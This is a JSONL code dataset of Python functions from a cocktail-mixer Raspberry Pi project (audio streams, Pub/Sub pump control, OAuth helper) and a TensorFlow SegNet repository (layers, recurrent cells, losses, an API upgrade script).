{"docstring": "\"\"\"Read bytes from the stream.\"\"\"\n", "func_signal": "def read(self, size):\n", "code": "buf, overflow = self._audio_stream.read(size)\nif overflow:\n    logging.warning('SoundDeviceStream read overflow (%d, %d)',\n                    size, len(buf))\nreturn bytes(buf)", "path": "software\\rpi\\audio_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Write bytes to the stream.\"\"\"\n", "func_signal": "def write(self, buf):\n", "code": "underflow = self._audio_stream.write(buf)\nif underflow:\n    logging.warning('SoundDeviceStream write underflow (size: %d)',\n                    len(buf))\nreturn len(buf)", "path": "software\\rpi\\audio_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\" Poll for new messages from the pull subscription \"\"\"\n\n", "func_signal": "def run(self):\n", "code": "while True:\n\n  # pull messages\n  results = self.subscription.pull(return_immediately=True)\n\n  for ack_id, message in results:\n\n      # convert bytes to string and slice string\n      # http://stackoverflow.com/questions/663171/is-there-a-way-to-substring-a-string-in-python\n      json_string = str(message.data)[3:-2]\n      json_string = json_string.replace('\\\\\\\\', '')\n      logging.info(json_string)\n\n      # create dict from json string\n      try:\n          json_obj = json.loads(json_string)\n      except Exception as e:\n          logging.error('JSON Error: %s', e)\n\n      # get intent from json\n      intent = json_obj['intent']\n      print('pub/sub: ' + intent)\n\n      # perform action based on intent\n      if intent == 'prime_pump_start':\n        PRIME_WHICH = json_obj['which_pump']\n        print('Start priming pump ' + PRIME_WHICH)\n        self.msg_queue.put('b' + PRIME_WHICH + 'r!') # turn on relay\n\n      elif intent == 'prime_pump_end':\n        if PRIME_WHICH != None:\n          print('Stop priming pump ' + PRIME_WHICH)\n          self.msg_queue.put('b' + PRIME_WHICH + 'l!') # turn off relay\n          PRIME_WHICH = None\n\n      elif intent == 'make_drink':\n        make_drink(json_obj['drink'], self.msg_queue)\n\n  # ack received message\n  if results:\n    self.subscription.acknowledge([ack_id for ack_id, message in results])\n\n  time.sleep(0.25)", "path": "software\\rpi\\__main__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Helper script to generate OAuth2 credentials.\n\"\"\"\n", "func_signal": "def main(client_secrets, scope, credentials):\n", "code": "creds = credentials_flow_interactive(client_secrets, scope)\nsave_credentials(credentials, creds)\nclick.echo('credentials saved: %s' % credentials)", "path": "software\\rpi\\auth_helpers\\__main__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Read bytes from the stream and block until sample rate is achieved.\n\nArgs:\n  size: number of bytes to read from the stream.\n\"\"\"\n", "func_signal": "def read(self, size):\n", "code": "now = time.time()\nmissing_dt = self._sleep_until - now\nif missing_dt > 0:\n    time.sleep(missing_dt)\nself._sleep_until = time.time() + self._sleep_time(size)\ndata = (self._wavep.readframes(size)\n        if self._wavep\n        else self._fp.read(size))\n#  When reach end of audio stream, pad remainder with silence (zeros).\nif not data:\n    return b'\\x00' * size\nreturn data", "path": "software\\rpi\\audio_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Stop playback from the audio sink.\"\"\"\n", "func_signal": "def stop_playback(self):\n", "code": "self._start_playback.clear()\nself._source.stop()\nself._sink.stop()", "path": "software\\rpi\\audio_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Read bytes from the source (if currently recording).\n\nWill returns an empty byte string, if stop_recording() was called.\n\"\"\"\n", "func_signal": "def read(self, size):\n", "code": "if self._stop_recording.is_set():\n    return b''\nreturn self._source.read(size)", "path": "software\\rpi\\audio_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "# output_shape = [b, w, h, c]\n# sess_temp = tf.InteractiveSession()\n", "func_signal": "def deconv_layer(inputT, f_shape, output_shape, stride=2, name=None):\n", "code": "sess_temp = tf.global_variables_initializer()\nstrides = [1, stride, stride, 1]\nwith tf.variable_scope(name):\n  weights = get_deconv_filter(f_shape)\n  deconv = tf.nn.conv2d_transpose(inputT, weights, output_shape,\n                                      strides=strides, padding='SAME')\nreturn deconv", "path": "model.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\"Convolutional Long short-term memory cell (ConvLSTM).\"\"\"\n", "func_signal": "def __call__(self, inputs, state, scope=None):\n", "code": "with vs.variable_scope(scope or type(self).__name__): # \"ConvLSTMCell\"\n  if self._state_is_tuple:\n    c, h = state\n  else:\n    c, h = array_ops.split(3, 2, state)\n  s1 = vs.get_variable(\"s1\", initializer=tf.ones([self._height, self._width, 4 * self._num_units]), dtype=tf.float32)\n  s2 = vs.get_variable(\"s2\", initializer=tf.ones([self._height, self._width, 4 * self._num_units]), dtype=tf.float32)\n  # s3 = vs.get_variable(\"s3\", initializer=tf.ones([self._batch_size, self._num_units]), dtype=tf.float32)\n\n  b1 = vs.get_variable(\"b1\", initializer=tf.zeros([self._height, self._width, 4 * self._num_units]), dtype=tf.float32)\n  b2 = vs.get_variable(\"b2\", initializer=tf.zeros([self._height, self._width, 4 * self._num_units]), dtype=tf.float32)\n  # b3 = vs.get_variable(\"b3\", initializer=tf.zeros([self._batch_size, self._num_units]), dtype=tf.float32)\n  input_below_ = _conv([inputs], 4 * self._num_units, self._k_size, False, initializer=self._initializer, scope=\"out_1\")\n  input_below_ = ln(input_below_, s1, b1)\n  state_below_ = _conv([h], 4 * self._num_units, self._k_size, False, initializer=self._initializer, scope=\"out_2\")\n  state_below_ = ln(state_below_, s2, b2)\n  lstm_matrix = tf.add(input_below_, state_below_)\n\n  i, j, f, o = array_ops.split(3, 4, lstm_matrix)\n\n  # batch_size * height * width * channel\n  # concat = _conv([inputs, h], 4 * self._num_units, self._k_size, True, initializer=self._initializer)\n\n  # i = input_gate, j = new_input, f = forget_gate, o = output_gate\n  # i, j, f, o = array_ops.split(3, 4, lstm_matrix)\n\n  new_c = (c * sigmoid(f + self._forget_bias) + sigmoid(i) *\n           self._activation(j))\n  new_h = self._activation(new_c) * sigmoid(o)\n\n  if self._state_is_tuple:\n    new_state = LSTMStateTuple(new_c, new_h)\n  else:\n    new_state = array_ops.concat(3, [new_c, new_h])\n  return new_h, new_state", "path": "convLSTM.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\" Layer normalizes a 4D tensor along its second axis, which corresponds to batch \"\"\"\n", "func_signal": "def ln(input, s, b, epsilon = 1e-5, max = 1000):\n", "code": "m, v = tf.nn.moments(input, [1,2,3], keep_dims=True) # for conv case ?\nnormalised_input = (input - m) / tf.sqrt(v + epsilon)\nreturn normalised_input * s + b", "path": "convLSTM.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\"Run this multi-layer cell on inputs, starting from state.\"\"\"\n", "func_signal": "def __call__(self, inputs, state, scope=None):\n", "code": "with vs.variable_scope(scope or type(self).__name__):  # \"MultiRNNCell\"\n  cur_state_pos = 0\n  cur_inp = inputs\n  new_states = []\n  for i, cell in enumerate(self._cells):\n    with vs.variable_scope(\"Cell%d\" % i):\n      if self._state_is_tuple:\n        if not nest.is_sequence(state):\n          raise ValueError(\n              \"Expected state to be a tuple of length %d, but received: %s\"\n              % (len(self.state_size), state))\n        cur_state = state[i]\n      else:\n        # print(\"STATE\",state)\n        \"\"\"\n        cur_state = array_ops.slice(\n            state, [0, cur_state_pos], [-1, cell.state_size])\n        \"\"\"\n        cur_state = array_ops.unpack(state)[i]\n        # cur_state_pos += cell.state_size\n      cur_inp, new_state = cell(cur_inp, cur_state)\n      new_states.append(new_state)\n\"\"\"\nnew_states = (tuple(new_states) if self._state_is_tuple\n              else array_ops.concat(1, new_states))\n\"\"\"\nnew_states = array_ops.pack(new_states)\nreturn cur_inp, new_states", "path": "convLSTM.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "''' From Lasagne and Keras. Reference: Saxe et al., http://arxiv.org/abs/1312.6120\n'''\n", "func_signal": "def orthogonal_initializer(scale = 1.1):\n", "code": "def _initializer(shape, dtype=tf.float32, partition_info=None):\n  flat_shape = (shape[0], np.prod(shape[1:]))\n  a = np.random.normal(0.0, 1.0, flat_shape)\n  u, _, v = np.linalg.svd(a, full_matrices=False)\n  # pick the one with the correct shape\n  q = u if u.shape == flat_shape else v\n  q = q.reshape(shape) #this needs to be corrected to float32\n  return tf.constant(scale * q[:shape[0], :shape[1]], dtype=tf.float32)\nreturn _initializer", "path": "model.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "# all edits are lists of chars\n", "func_signal": "def __init__(self, filename):\n", "code": "self._filename = filename\n\nself._line_to_edit = collections.defaultdict(list)\nself._errors = []", "path": "tf_upgrade.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\"\n  reference: https://github.com/MarvinTeichmann/tensorflow-fcn\n\"\"\"\n", "func_signal": "def get_deconv_filter(f_shape):\n", "code": "width = f_shape[0]\nheigh = f_shape[0]\nf = ceil(width/2.0)\nc = (2 * f - 1 - f % 2) / (2.0 * f)\nbilinear = np.zeros([f_shape[0], f_shape[1]])\nfor x in range(width):\n    for y in range(heigh):\n        value = (1 - abs(x / f - c)) * (1 - abs(y / f - c))\n        bilinear[x, y] = value\nweights = np.zeros(f_shape)\nfor i in range(f_shape[2]):\n    weights[:, :, i, i] = bilinear\n\ninit = tf.constant_initializer(value=weights,\n                               dtype=tf.float32)\nreturn tf.get_variable(name=\"up_filter\", initializer=init,\n                       shape=weights.shape)", "path": "model.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\"\nkl for kernel size, dl for filter number\n\"\"\"\n", "func_signal": "def msra_initializer(kl, dl):\n", "code": "stddev = math.sqrt(2. / (kl**2 * dl))\nreturn tf.truncated_normal_initializer(stddev=stddev)", "path": "model.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "# Maps from a function name to a dictionary that describes how to\n# map from an old argument keyword to the new argument keyword.\n", "func_signal": "def __init__(self):\n", "code": "self.function_keyword_renames = {\n    \"tf.batch_matmul\": {\n        \"adj_x\": \"adjoint_a\",\n        \"adj_y\": \"adjoint_b\",\n    },\n    \"tf.count_nonzero\": {\n        \"reduction_indices\": \"axis\"\n    },\n    \"tf.reduce_all\": {\n        \"reduction_indices\": \"axis\"\n    },\n    \"tf.reduce_any\": {\n        \"reduction_indices\": \"axis\"\n    },\n    \"tf.reduce_max\": {\n        \"reduction_indices\": \"axis\"\n    },\n    \"tf.reduce_mean\": {\n        \"reduction_indices\": \"axis\"\n    },\n    \"tf.reduce_min\": {\n        \"reduction_indices\": \"axis\"\n    },\n    \"tf.reduce_prod\": {\n        \"reduction_indices\": \"axis\"\n    },\n    \"tf.reduce_sum\": {\n        \"reduction_indices\": \"axis\"\n    },\n    \"tf.reduce_logsumexp\": {\n        \"reduction_indices\": \"axis\"\n    },\n    \"tf.expand_dims\": {\n        \"dim\": \"axis\"\n    },\n    \"tf.argmax\": {\n        \"dimension\": \"axis\"\n    },\n    \"tf.argmin\": {\n        \"dimension\": \"axis\"\n    },\n    \"tf.reduce_join\": {\n        \"reduction_indices\": \"axis\"\n    },\n    \"tf.sparse_concat\": {\n        \"concat_dim\": \"axis\"\n    },\n    \"tf.sparse_split\": {\n        \"split_dim\": \"axis\"\n    },\n    \"tf.sparse_reduce_sum\": {\n        \"reduction_axes\": \"axis\"\n    },\n    \"tf.reverse_sequence\": {\n        \"seq_dim\": \"seq_axis\",\n        \"batch_dim\": \"batch_axis\"\n    },\n    \"tf.sparse_reduce_sum_sparse\": {\n        \"reduction_axes\": \"axis\"\n    },\n    \"tf.squeeze\": {\n        \"squeeze_dims\": \"axis\"\n    },\n    \"tf.split\": {\n        \"split_dim\": \"axis\",\n        \"num_split\": \"num_or_size_splits\"\n    },\n    \"tf.concat\": {\n        \"concat_dim\": \"axis\"\n    },\n}\n\n# Mapping from function to the new name of the function\nself.function_renames = {\n    \"tf.inv\": \"tf.reciprocal\",\n    \"tf.contrib.deprecated.scalar_summary\": \"tf.summary.scalar\",\n    \"tf.contrib.deprecated.histogram_summary\": \"tf.summary.histogram\",\n    \"tf.listdiff\": \"tf.setdiff1d\",\n    \"tf.list_diff\": \"tf.setdiff1d\",\n    \"tf.mul\": \"tf.multiply\",\n    \"tf.neg\": \"tf.negative\",\n    \"tf.sub\": \"tf.subtract\",\n    \"tf.train.SummaryWriter\": \"tf.summary.FileWriter\",\n    \"tf.scalar_summary\": \"tf.summary.scalar\",\n    \"tf.histogram_summary\": \"tf.summary.histogram\",\n    \"tf.audio_summary\": \"tf.summary.audio\",\n    \"tf.image_summary\": \"tf.summary.image\",\n    \"tf.merge_summary\": \"tf.summary.merge\",\n    \"tf.merge_all_summaries\": \"tf.summary.merge_all\",\n    \"tf.image.per_image_whitening\": \"tf.image.per_image_standardization\",\n    \"tf.all_variables\": \"tf.global_variables\",\n    \"tf.VARIABLES\": \"tf.GLOBAL_VARIABLES\",\n    \"tf.initialize_all_variables\": \"tf.global_variables_initializer\",\n    \"tf.initialize_variables\": \"tf.variables_initializer\",\n    \"tf.initialize_local_variables\": \"tf.local_variables_initializer\",\n    \"tf.batch_matrix_diag\": \"tf.matrix_diag\",\n    \"tf.batch_band_part\": \"tf.band_part\",\n    \"tf.batch_set_diag\": \"tf.set_diag\",\n    \"tf.batch_matrix_transpose\": \"tf.matrix_transpose\",\n    \"tf.batch_matrix_determinant\": \"tf.matrix_determinant\",\n    \"tf.batch_matrix_inverse\": \"tf.matrix_inverse\",\n    \"tf.batch_cholesky\": \"tf.cholesky\",\n    \"tf.batch_cholesky_solve\": \"tf.cholesky_solve\",\n    \"tf.batch_matrix_solve\": \"tf.matrix_solve\",\n    \"tf.batch_matrix_triangular_solve\": \"tf.matrix_triangular_solve\",\n    \"tf.batch_matrix_solve_ls\": \"tf.matrix_solve_ls\",\n    \"tf.batch_self_adjoint_eig\": \"tf.self_adjoint_eig\",\n    \"tf.batch_self_adjoint_eigvals\": \"tf.self_adjoint_eigvals\",\n    \"tf.batch_svd\": \"tf.svd\",\n    \"tf.batch_fft\": \"tf.fft\",\n    \"tf.batch_ifft\": \"tf.ifft\",\n    \"tf.batch_fft2d\": \"tf.fft2d\",\n    \"tf.batch_ifft2d\": \"tf.ifft2d\",\n    \"tf.batch_fft3d\": \"tf.fft3d\",\n    \"tf.batch_ifft3d\": \"tf.ifft3d\",\n    \"tf.select\": \"tf.where\",\n    \"tf.complex_abs\": \"tf.abs\",\n    \"tf.batch_matmul\": \"tf.matmul\",\n    \"tf.pack\": \"tf.stack\",\n    \"tf.unpack\": \"tf.unstack\",\n    \"tf.op_scope\": \"tf.name_scope\",\n}\n\nself.change_to_function = {\n    \"tf.ones_initializer\",\n    \"tf.zeros_initializer\",\n}\n\n# Functions that were reordered should be changed to the new keyword args\n# for safety, if positional arguments are used. If you have reversed the\n# positional arguments yourself, this could do the wrong thing.\nself.function_reorders = {\n    \"tf.split\": [\"axis\", \"num_or_size_splits\", \"value\", \"name\"],\n    \"tf.sparse_split\": [\"axis\", \"num_or_size_splits\", \"value\", \"name\"],\n    \"tf.concat\": [\"concat_dim\", \"values\", \"name\"],\n    \"tf.svd\": [\"tensor\", \"compute_uv\", \"full_matrices\", \"name\"],\n    \"tf.nn.softmax_cross_entropy_with_logits\": [\n        \"logits\", \"labels\", \"dim\", \"name\"],\n    \"tf.nn.sparse_softmax_cross_entropy_with_logits\": [\n        \"logits\", \"labels\", \"name\"],\n    \"tf.nn.sigmoid_cross_entropy_with_logits\": [\n        \"logits\", \"labels\", \"name\"],\n    \"tf.op_scope\": [\"values\", \"name\", \"default_name\"],\n}\n\n# Specially handled functions.\nself.function_handle = {\"tf.reverse\": self._reverse_handler}", "path": "tf_upgrade.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\"\n    loss func without re-weighting\n\"\"\"\n# Calculate the average cross entropy loss across the batch.\n", "func_signal": "def loss(logits, labels):\n", "code": "logits = tf.reshape(logits, (-1,NUM_CLASSES))\nlabels = tf.reshape(labels, [-1])\n\ncross_entropy = tf.nn.sparse_softmax_cross_entropy_with_logits(\n    logits=logits, labels=labels, name='cross_entropy_per_example')\ncross_entropy_mean = tf.reduce_mean(cross_entropy, name='cross_entropy')\ntf.add_to_collection('losses', cross_entropy_mean)\n\nreturn tf.add_n(tf.get_collection('losses'), name='total_loss')", "path": "model.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\"Process the given python file for incompatible changes.\nArgs:\n  in_filename: filename to parse\n  out_filename: output file to write to\nReturns:\n  A tuple representing number of files processed, log of actions, errors\n\"\"\"\n\n# Write to a temporary file, just in case we are doing an implace modify.\n", "func_signal": "def process_file(self, in_filename, out_filename):\n", "code": "with open(in_filename, \"r\") as in_file, \\\n    tempfile.NamedTemporaryFile(\"w\", delete=False) as temp_file:\n  ret = self.process_opened_file(\n      in_filename, in_file, out_filename, temp_file)\n\nshutil.move(temp_file.name, out_filename)\nreturn ret", "path": "tf_upgrade.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\"Process the given python file for incompatible changes.\nThis function is split out to facilitate StringIO testing from\ntf_upgrade_test.py.\nArgs:\n  in_filename: filename to parse\n  in_file: opened file (or StringIO)\n  out_filename: output file to write to\n  out_file: opened file (or StringIO)\nReturns:\n  A tuple representing number of files processed, log of actions, errors\n\"\"\"\n", "func_signal": "def process_opened_file(self, in_filename, in_file, out_filename, out_file):\n", "code": "process_errors = []\ntext = \"-\" * 80 + \"\\n\"\ntext += \"Processing file %r\\n outputting to %r\\n\" % (in_filename,\n                                                     out_filename)\ntext += \"-\" * 80 + \"\\n\\n\"\n\nparsed_ast = None\nlines = in_file.readlines()\ntry:\n  parsed_ast = ast.parse(\"\".join(lines))\nexcept Exception:\n  text += \"Failed to parse %r\\n\\n\" % in_filename\n  text += traceback.format_exc()\nif parsed_ast:\n  visitor = TensorFlowCallVisitor(in_filename, lines)\n  visitor.visit(parsed_ast)\n  out_text, new_text, process_errors = visitor.process(lines)\n  text += new_text\n  if out_file:\n    out_file.write(out_text)\ntext += \"\\n\"\nreturn 1, text, process_errors", "path": "tf_upgrade.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "# norm1\n", "func_signal": "def inference(images, labels, batch_size, phase_train):\n", "code": "norm1 = tf.nn.lrn(images, depth_radius=5, bias=1.0, alpha=0.0001, beta=0.75,\n            name='norm1')\n# conv1\nconv1 = conv_layer_with_bn(norm1, [7, 7, images.get_shape().as_list()[3], 64], phase_train, name=\"conv1\")\n# pool1\npool1, pool1_indices = tf.nn.max_pool_with_argmax(conv1, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1],\n                       padding='SAME', name='pool1')\n# conv2\nconv2 = conv_layer_with_bn(pool1, [7, 7, 64, 64], phase_train, name=\"conv2\")\n\n# pool2\npool2, pool2_indices = tf.nn.max_pool_with_argmax(conv2, ksize=[1, 2, 2, 1],\n                       strides=[1, 2, 2, 1], padding='SAME', name='pool2')\n# conv3\nconv3 = conv_layer_with_bn(pool2, [7, 7, 64, 64], phase_train, name=\"conv3\")\n\n# pool3\npool3, pool3_indices = tf.nn.max_pool_with_argmax(conv3, ksize=[1, 2, 2, 1],\n                       strides=[1, 2, 2, 1], padding='SAME', name='pool3')\n# conv4\nconv4 = conv_layer_with_bn(pool3, [7, 7, 64, 64], phase_train, name=\"conv4\")\n\n# pool4\npool4, pool4_indices = tf.nn.max_pool_with_argmax(conv4, ksize=[1, 2, 2, 1],\n                       strides=[1, 2, 2, 1], padding='SAME', name='pool4')\n\n\"\"\" End of encoder \"\"\"\n\"\"\" start upsample \"\"\"\n# upsample4\n# Need to change when using different dataset out_w, out_h\n# upsample4 = upsample_with_pool_indices(pool4, pool4_indices, pool4.get_shape(), out_w=45, out_h=60, scale=2, name='upsample4')\nupsample4 = deconv_layer(pool4, [2, 2, 64, 64], [batch_size, 45, 60, 64], 2, \"up4\")\n# decode 4\nconv_decode4 = conv_layer_with_bn(upsample4, [7, 7, 64, 64], phase_train, False, name=\"conv_decode4\")\n\n# upsample 3\n# upsample3 = upsample_with_pool_indices(conv_decode4, pool3_indices, conv_decode4.get_shape(), scale=2, name='upsample3')\nupsample3= deconv_layer(conv_decode4, [2, 2, 64, 64], [batch_size, 90, 120, 64], 2, \"up3\")\n# decode 3\nconv_decode3 = conv_layer_with_bn(upsample3, [7, 7, 64, 64], phase_train, False, name=\"conv_decode3\")\n\n# upsample2\n# upsample2 = upsample_with_pool_indices(conv_decode3, pool2_indices, conv_decode3.get_shape(), scale=2, name='upsample2')\nupsample2= deconv_layer(conv_decode3, [2, 2, 64, 64], [batch_size, 180, 240, 64], 2, \"up2\")\n# decode 2\nconv_decode2 = conv_layer_with_bn(upsample2, [7, 7, 64, 64], phase_train, False, name=\"conv_decode2\")\n\n# upsample1\n# upsample1 = upsample_with_pool_indices(conv_decode2, pool1_indices, conv_decode2.get_shape(), scale=2, name='upsample1')\nupsample1= deconv_layer(conv_decode2, [2, 2, 64, 64], [batch_size, 360, 480, 64], 2, \"up1\")\n# decode4\nconv_decode1 = conv_layer_with_bn(upsample1, [7, 7, 64, 64], phase_train, False, name=\"conv_decode1\")\n\"\"\" end of Decode \"\"\"\n\"\"\" Start Classify \"\"\"\n# output predicted class number (6)\nwith tf.variable_scope('conv_classifier') as scope:\n  kernel = _variable_with_weight_decay('weights',\n                                       shape=[1, 1, 64, NUM_CLASSES],\n                                       initializer=msra_initializer(1, 64),\n                                       wd=0.0005)\n  conv = tf.nn.conv2d(conv_decode1, kernel, [1, 1, 1, 1], padding='SAME')\n  biases = _variable_on_cpu('biases', [NUM_CLASSES], tf.constant_initializer(0.0))\n  conv_classifier = tf.nn.bias_add(conv, biases, name=scope.name)\n\nlogit = conv_classifier\nloss = cal_loss(conv_classifier, labels)\n\nreturn loss, logit", "path": "model.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "# TODO(aselle): Could check for a literal list of bools and try to convert\n# them to indices.\n", "func_signal": "def _reverse_handler(file_edit_recorder, node):\n", "code": "comment = (\"ERROR: tf.reverse has had its argument semantics changed\\n\"\n           \"significantly the converter cannot detect this reliably, so you\"\n           \"need to inspect this usage manually.\\n\")\nfile_edit_recorder.add(comment,\n                       node.lineno,\n                       node.col_offset,\n                       \"tf.reverse\",\n                       \"tf.reverse\",\n                       error=\"tf.reverse requires manual check.\")", "path": "tf_upgrade.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\"Add a new change that is needed.\nArgs:\n  comment: A description of what was changed\n  line: Line number (1 indexed)\n  start: Column offset (0 indexed)\n  old: old text\n  new: new text\n  error: this \"edit\" is something that cannot be fixed automatically\nReturns:\n  None\n\"\"\"\n\n", "func_signal": "def add(self, comment, line, start, old, new, error=None):\n", "code": "self._line_to_edit[line].append(\n    FileEditTuple(comment, line, start, old, new))\nif error:\n  self._errors.append(\"%s:%d: %s\" % (self._filename, line, error))", "path": "tf_upgrade.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\"Gated recurrent unit (GRU) with nunits cells.\"\"\"\n", "func_signal": "def __call__(self, inputs, state, scope=None):\n", "code": "with vs.variable_scope(scope or type(self).__name__):  # \"GRUCell\"\n  with vs.variable_scope(\"Gates\"):  # Reset gate and update gate.\n    # We start with bias of 1.0 to not reset and not update.\n    r, u = array_ops.split(3, 2, _conv([inputs, state],\n                                         2 * self._num_units, self._k_size, True, initializer=self._initializer))\n    r, u = sigmoid(r), sigmoid(u)\n  with vs.variable_scope(\"Candidate\"):\n    c = self._activation(_conv([inputs, r * state],\n                                 self._num_units, self._k_size, True, initializer=self._initializer))\n  new_h = u * state + (1 - u) * c\nreturn new_h, new_h", "path": "convLSTM.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\" median-frequency re-weighting \"\"\"\n", "func_signal": "def weighted_loss(logits, labels, num_classes, head=None):\n", "code": "with tf.name_scope('loss'):\n\n    logits = tf.reshape(logits, (-1, num_classes))\n\n    epsilon = tf.constant(value=1e-10)\n\n    logits = logits + epsilon\n\n    # consturct one-hot label array\n    label_flat = tf.reshape(labels, (-1, 1))\n\n    # should be [batch ,num_classes]\n    labels = tf.reshape(tf.one_hot(label_flat, depth=num_classes), (-1, num_classes))\n\n    softmax = tf.nn.softmax(logits)\n\n    cross_entropy = -tf.reduce_sum(tf.multiply(labels * tf.log(softmax + epsilon), head), axis=[1])\n\n    cross_entropy_mean = tf.reduce_mean(cross_entropy, name='cross_entropy')\n\n    tf.add_to_collection('losses', cross_entropy_mean)\n\n    loss = tf.add_n(tf.get_collection('losses'), name='total_loss')\n\nreturn loss", "path": "model.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\"Process a list of strings, each corresponding to the recorded changes.\nArgs:\n  text: A list of lines of text (assumed to contain newlines)\nReturns:\n  A tuple of the modified text and a textual description of what is done.\nRaises:\n  ValueError: if substitution source location does not have expected text.\n\"\"\"\n\n", "func_signal": "def process(self, text):\n", "code": "change_report = \"\"\n\n# Iterate of each line\nfor line, edits in self._line_to_edit.items():\n  offset = 0\n  # sort by column so that edits are processed in order in order to make\n  # indexing adjustments cumulative for changes that change the string\n  # length\n  edits.sort(key=lambda x: x.start)\n\n  # Extract each line to a list of characters, because mutable lists\n  # are editable, unlike immutable strings.\n  char_array = list(text[line - 1])\n\n  # Record a description of the change\n  change_report += \"%r Line %d\\n\" % (self._filename, line)\n  change_report += \"-\" * 80 + \"\\n\\n\"\n  for e in edits:\n    change_report += \"%s\\n\" % e.comment\n  change_report += \"\\n    Old: %s\" % (text[line - 1])\n\n  # Make underscore buffers for underlining where in the line the edit was\n  change_list = [\" \"] * len(text[line - 1])\n  change_list_new = [\" \"] * len(text[line - 1])\n\n  # Iterate for each edit\n  for e in edits:\n    # Create effective start, end by accounting for change in length due\n    # to previous edits\n    start_eff = e.start + offset\n    end_eff = start_eff + len(e.old)\n\n    # Make sure the edit is changing what it should be changing\n    old_actual = \"\".join(char_array[start_eff:end_eff])\n    if old_actual != e.old:\n      raise ValueError(\"Expected text %r but got %r\" %\n                       (\"\".join(e.old), \"\".join(old_actual)))\n    # Make the edit\n    char_array[start_eff:end_eff] = list(e.new)\n\n    # Create the underline highlighting of the before and after\n    change_list[e.start:e.start + len(e.old)] = \"~\" * len(e.old)\n    change_list_new[start_eff:end_eff] = \"~\" * len(e.new)\n\n    # Keep track of how to generate effective ranges\n    offset += len(e.new) - len(e.old)\n\n  # Finish the report comment\n  change_report += \"         %s\\n\" % \"\".join(change_list)\n  text[line - 1] = \"\".join(char_array)\n  change_report += \"    New: %s\" % (text[line - 1])\n  change_report += \"         %s\\n\\n\" % \"\".join(change_list_new)\nreturn \"\".join(text), change_report, self._errors", "path": "tf_upgrade.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\"Traverse an attribute to generate a full name e.g. tf.foo.bar.\nArgs:\n  node: A Node of type Attribute.\nReturns:\n  a '.'-delimited full-name or None if the tree was not a simple form.\n  i.e. `foo()+b).bar` returns None, while `a.b.c` would return \"a.b.c\".\n\"\"\"\n", "func_signal": "def _get_attribute_full_path(self, node):\n", "code": "curr = node\nitems = []\nwhile not isinstance(curr, ast.Name):\n  if not isinstance(curr, ast.Attribute):\n    return None\n  items.append(curr.attr)\n  curr = curr.value\nitems.append(curr.id)\nreturn \".\".join(reversed(items))", "path": "tf_upgrade.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
